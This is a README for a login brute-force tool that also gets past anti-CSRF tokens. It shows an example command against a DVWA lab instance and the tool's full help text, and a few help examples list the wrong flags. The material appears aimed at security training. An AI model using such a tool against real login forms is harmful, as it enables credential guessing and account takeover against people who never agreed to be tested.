# Brute Force + Anti-CSRF Token Bypass
### Can be used to brute force a login form. Also supports anti-csrf token bypass.
```
./anti_csrf_brute.py -P ./password.txt -u http://192.168.0.112/dvwa/vulnerabilities/brute -c "PHPSESSID:tjj0esrnt64heiqr50hbbpj8s4;security:high;" -F incorrect -param username:admin;password:^PASS^;Login:Login;user_token:^CSRF^"


usage: anti_csrf_brute.py [-h] [-c COOKIES] [-u URL] [-param PARAM] [-l LOGIN]
                          [-p PASSWORD] [-L LOGINLIST] [-P PASSWORDLIST]
                          [-C CSRFXPATH] [-F FAILEDTEXT] [-m METHOD]

optional arguments:
  -h, --help            show this help message and exit
  -c COOKIES, --cookies COOKIES
                        Cookies: -c PHPSESSID:f8ucrbu0qmta4ettc3208gcvnq&
                        security:low
  -u URL, --url URL     URL: -u http://127.0.0.1/
  -param PARAM, --param PARAM
                        Param: -p username:admin; password:123456; OR -p
                        username:^USER^; password:^PASS^
  -l LOGIN, --login LOGIN
                        Login: -l admin
  -p PASSWORD, --password PASSWORD
                        Password: -p password
  -L LOGINLIST, --loginlist LOGINLIST
                        LoginList: -l ~/users.txt
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password: -p password
  -C CSRFXPATH, --csrfxpath CSRFXPATH
                        CSRF-Xpath: //input[@name='user_token']/@value
  -F FAILEDTEXT, --failedtext FAILEDTEXT
                        Failed Login Text: Incorrect password
  -m METHOD, --method METHOD
                        Method: -m get OR -m POST
```


